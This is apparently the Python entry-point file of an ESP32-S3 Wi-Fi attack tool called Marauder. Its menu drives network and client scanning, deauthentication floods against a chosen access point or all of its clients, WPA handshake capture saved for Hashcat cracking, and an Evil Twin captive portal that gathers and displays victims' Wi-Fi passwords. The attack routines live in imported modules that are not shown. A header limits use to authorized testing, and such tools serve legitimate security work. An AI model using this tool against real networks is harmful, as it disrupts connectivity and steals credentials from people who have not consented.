# main.py — CLI entry point for ESP32-S3 Marauder
#
# Part of ESP32-S3 Marauder — Wi-Fi Security Testing Tool
#
# WARNING: This tool is intended for AUTHORIZED penetration testing and
# educational purposes ONLY.  Unauthorized use is illegal.

import sys
import gc
import time

try:
    import _wifi_raw
    HAS_WIFI_RAW = True
except ImportError:
    HAS_WIFI_RAW = False
    print('[WARN] _wifi_raw C module not found.')
    print('       Deauth, handshake capture, and client scanning')
    print('       require custom firmware. See BUILD_INSTRUCTIONS.md')
    print()

from utils import log, log_error, log_warn, mac_str_to_bytes, free_mem, format_bytes
from scanner import WiFiScanner
from deauther import Deauther
from handshake import HandshakeCapture
from evil_twin import EvilTwin


# ---------------------------------------------------------------------------
# Global instances
# ---------------------------------------------------------------------------
scanner = WiFiScanner()
deauther = Deauther()
handshake = HandshakeCapture()
evil_twin = EvilTwin()

# Selected targets
selected_ap = None
selected_client = None


# ---------------------------------------------------------------------------
# Menu system
# ---------------------------------------------------------------------------

MAIN_MENU = """
============================================
  ESP32-S3 Marauder  v0.1
  Wi-Fi Security Testing Tool
  RAM: {ram}
============================================

  [1]  Scan Wi-Fi Networks
  [2]  Scan Clients (promiscuous)
  [3]  Select Target AP
  [4]  Select Target Client
  ----
  [5]  Deauth Attack
  [6]  Capture Handshake
  [7]  Evil Twin + Captive Portal
  ----
  [8]  View Captured Data
  [9]  Settings & Info
  [0]  Reboot
  [q]  Exit to REPL

  Target AP:     {ap}
  Target Client: {client}
============================================
"""


def show_menu():
    """Print the main menu."""
    ap_str = '(none)'
    if selected_ap:
        ap_str = '%s [%s] ch%d' % (
            selected_ap['ssid'] or '<hidden>',
            selected_ap['bssid_str'],
            selected_ap['channel'])

    client_str = '(none)'
    if selected_client:
        client_str = selected_client['mac_str']

    print(MAIN_MENU.format(
        ram=format_bytes(free_mem()),
        ap=ap_str,
        client=client_str,
    ))


def read_input(prompt='> '):
    """Read a line of user input from serial."""
    try:
        return input(prompt).strip()
    except EOFError:
        return ''
    except KeyboardInterrupt:
        print()
        return ''


def read_int(prompt='> ', default=None):
    """Read an integer from user input."""
    s = read_input(prompt)
    if not s and default is not None:
        return default
    try:
        return int(s)
    except ValueError:
        print('Invalid number: %s' % s)
        return None


# ---------------------------------------------------------------------------
# Menu actions
# ---------------------------------------------------------------------------

def action_scan_aps():
    """Scan for Wi-Fi access points."""
    print()
    t = read_int('Scan timeout (seconds) [10]: ', default=10)
    if t is None:
        return
    scanner.scan_aps(timeout=t)
    print()
    scanner.print_aps()


def action_scan_clients():
    """Scan for client devices using promiscuous mode."""
    if not HAS_WIFI_RAW:
        print('ERROR: Requires _wifi_raw C module (custom firmware)')
        return

    print()
    _wifi_raw.init()

    bssid = None
    if selected_ap:
        yn = read_input('Filter by selected AP? [Y/n]: ') or 'y'
        if yn.lower() in ('y', 'yes', ''):
            bssid = selected_ap['bssid']

    t = read_int('Scan timeout (seconds) [15]: ', default=15)
    if t is None:
        return

    scanner.scan_clients(target_bssid=bssid, timeout=t)
    print()
    scanner.print_clients()


def action_select_ap():
    """Select a target AP from scan results."""
    global selected_ap

    if not scanner.ap_list:
        print('No APs found. Run scan first (option 1).')
        return

    scanner.print_aps()
    idx = read_int('Select AP # : ')
    if idx is None:
        return

    ap = scanner.select_ap(idx)
    if ap:
        selected_ap = ap
        print('Selected: %s [%s] ch%d (%s)' % (
            ap['ssid'], ap['bssid_str'], ap['channel'], ap['auth_str']))
    else:
        print('Invalid index')


def action_select_client():
    """Select a target client from scan results."""
    global selected_client

    if not scanner.client_list:
        print('No clients found. Run client scan first (option 2).')
        return

    scanner.print_clients()
    idx = read_int('Select Client # : ')
    if idx is None:
        return

    cl = scanner.select_client(idx)
    if cl:
        selected_client = cl
        print('Selected: %s (AP: %s)' % (cl['mac_str'], cl['bssid_str']))
    else:
        print('Invalid index')


def action_deauth():
    """Launch deauthentication attack."""
    if not HAS_WIFI_RAW:
        print('ERROR: Requires _wifi_raw C module (custom firmware)')
        return

    if not selected_ap:
        print('ERROR: Select a target AP first (option 3)')
        return

    _wifi_raw.init()

    print()
    print('Deauth Modes:')
    print('  [1] Deauth specific client')
    print('  [2] Deauth ALL clients (broadcast)')
    print()
    mode = read_int('Mode: ')

    if mode == 1:
        if not selected_client:
            mac_str = read_input('Client MAC (AA:BB:CC:DD:EE:FF): ')
            if not mac_str:
                return
            try:
                client_mac = mac_str_to_bytes(mac_str)
            except Exception:
                print('Invalid MAC address')
                return
        else:
            client_mac = selected_client['mac']
            print('Using selected client: %s' % selected_client['mac_str'])

        count = read_int('Number of rounds [100]: ', default=100)
        delay = read_int('Delay between rounds (ms) [100]: ', default=100)
        if count is None or delay is None:
            return

        deauther.deauth_client(
            selected_ap['bssid'], client_mac, selected_ap['channel'],
            count=count, delay_ms=delay)

    elif mode == 2:
        count = read_int('Number of rounds [100]: ', default=100)
        delay = read_int('Delay between rounds (ms) [100]: ', default=100)
        if count is None or delay is None:
            return

        deauther.deauth_broadcast(
            selected_ap['bssid'], selected_ap['channel'],
            count=count, delay_ms=delay)
    else:
        print('Invalid mode')


def action_capture_handshake():
    """Capture WPA 4-way handshake."""
    if not HAS_WIFI_RAW:
        print('ERROR: Requires _wifi_raw C module (custom firmware)')
        return

    if not selected_ap:
        print('ERROR: Select a target AP first (option 3)')
        return

    _wifi_raw.init()

    print()
    yn = read_input('Auto-deauth to force reconnection? [Y/n]: ') or 'y'
    auto_deauth = yn.lower() in ('y', 'yes', '')

    interval = 5
    if auto_deauth:
        interval = read_int('Deauth interval (seconds) [5]: ', default=5)
        if interval is None:
            interval = 5

    print()
    print('Starting handshake capture...')
    print('Press Ctrl+C to stop.')
    print()

    handshake.start(
        target_bssid=selected_ap['bssid'],
        channel=selected_ap['channel'],
        ssid=selected_ap['ssid'],
        auto_deauth=auto_deauth,
        deauth_interval=interval)

    if handshake.is_complete:
        print()
        print('Handshake captured successfully!')
        print()

        yn = read_input('Save as Hashcat 22000? [Y/n]: ') or 'y'
        if yn.lower() in ('y', 'yes', ''):
            path = handshake.save_hc22000()
            if path:
                print('Saved: %s' % path)

        yn = read_input('Save as PCAP? [Y/n]: ') or 'y'
        if yn.lower() in ('y', 'yes', ''):
            path = handshake.save_pcap()
            if path:
                print('Saved: %s' % path)
    else:
        print()
        print('Handshake incomplete: %s' % handshake.status_str)
        yn = read_input('Save partial capture anyway? [y/N]: ') or 'n'
        if yn.lower() in ('y', 'yes'):
            handshake.save_pcap()


def action_evil_twin():
    """Launch Evil Twin attack with captive portal."""
    if not selected_ap:
        # Allow manual SSID entry
        ssid = read_input('Target SSID: ')
        if not ssid:
            print('ERROR: SSID required')
            return
        bssid = None
        channel = read_int('Channel [1]: ', default=1)
        if channel is None:
            channel = 1
    else:
        ssid = selected_ap['ssid']
        bssid = selected_ap['bssid']
        channel = selected_ap['channel']
        print('Cloning AP: %s [%s] ch%d' % (ssid, selected_ap['bssid_str'], channel))

    print()
    yn = read_input('Deauth original AP clients? [Y/n]: ') or 'y'
    do_deauth = yn.lower() in ('y', 'yes', '')

    if do_deauth and bssid is None:
        mac_str = read_input('Original AP BSSID (or Enter to skip deauth): ')
        if mac_str:
            try:
                bssid = mac_str_to_bytes(mac_str)
            except Exception:
                print('Invalid MAC — deauth disabled')
                do_deauth = False
        else:
            do_deauth = False

    print()
    print('Launching Evil Twin...')
    print('Press Ctrl+C or type "q" to stop.')
    print()

    evil_twin.start(
        target_ssid=ssid,
        target_bssid=bssid,
        target_channel=channel,
        deauth_original=do_deauth)


def action_view_data():
    """View captured data (handshakes, credentials, files)."""
    print()
    print('=== Captured Data ===')
    print()

    # Handshake status
    print('-- Handshake Capture --')
    print('Status: %s' % handshake.status_str)
    if handshake.target_ssid:
        print('SSID:   %s' % handshake.target_ssid)
    print()

    # Portal credentials
    print('-- Portal Credentials --')
    creds = evil_twin.captured_credentials
    if creds:
        for i, c in enumerate(creds):
            print('  [%d] Password: %-20s  Client: %-15s  Time: %s' %
                  (i + 1, c['password'], c['client_ip'], c['time']))
    else:
        print('  (none)')
    print()

    # Saved files
    print('-- Saved Files --')
    from utils import get_storage_path, list_files
    storage = get_storage_path()
    for subdir in ('captures/handshakes', 'captures/portals'):
        path = '%s/%s' % (storage, subdir) if storage else '/%s' % subdir
        files = list_files(path)
        for fname in files:
            print('  %s/%s' % (path, fname))
    print()


def action_settings():
    """Display system info and settings."""
    print()
    print('=== System Info ===')
    print()
    print('Firmware:     ESP32-S3 Marauder v0.1')
    print('_wifi_raw:    %s' % ('Available' if HAS_WIFI_RAW else 'NOT FOUND'))
    print('Free RAM:     %s' % format_bytes(free_mem()))

    import os
    try:
        fs = os.statvfs('/')
        total = fs[0] * fs[2]
        free = fs[0] * fs[3]
        print('Flash FS:     %s free / %s total' %
              (format_bytes(free), format_bytes(total)))
    except Exception:
        pass

    from utils import get_storage_path
    storage = get_storage_path()
    print('Storage:      %s' % (storage if storage else 'Internal flash'))
    if storage == '/sd':
        try:
            fs = os.statvfs('/sd')
            total = fs[0] * fs[2]
            free = fs[0] * fs[3]
            print('SD Card:      %s free / %s total' %
                  (format_bytes(free), format_bytes(total)))
        except Exception:
            pass

    print('Platform:     %s' % sys.platform)
    print()

    if HAS_WIFI_RAW:
        print('Channel:      %d' % _wifi_raw.get_channel())
    print()


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------

def main():
    """Main CLI loop."""
    # Initialize WiFi raw module if available
    if HAS_WIFI_RAW:
        try:
            _wifi_raw.init()
            log('WiFi raw module initialized')
        except Exception as e:
            log_error('WiFi init failed: %s' % str(e))

    actions = {
        '1': action_scan_aps,
        '2': action_scan_clients,
        '3': action_select_ap,
        '4': action_select_client,
        '5': action_deauth,
        '6': action_capture_handshake,
        '7': action_evil_twin,
        '8': action_view_data,
        '9': action_settings,
    }

    while True:
        try:
            show_menu()
            choice = read_input('> ')

            if choice == '0':
                print('Rebooting...')
                import machine
                machine.reset()

            elif choice in ('q', 'Q', 'quit', 'exit'):
                print('Exiting to REPL. Type main() to return.')
                break

            elif choice in actions:
                gc.collect()
                actions[choice]()
                gc.collect()

            elif choice:
                print('Unknown option: %s' % choice)

        except KeyboardInterrupt:
            print('\nPress 0 to reboot or q to exit to REPL.')
        except Exception as e:
            log_error('Error: %s' % str(e))
            gc.collect()


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
if __name__ == '__main__':
    main()
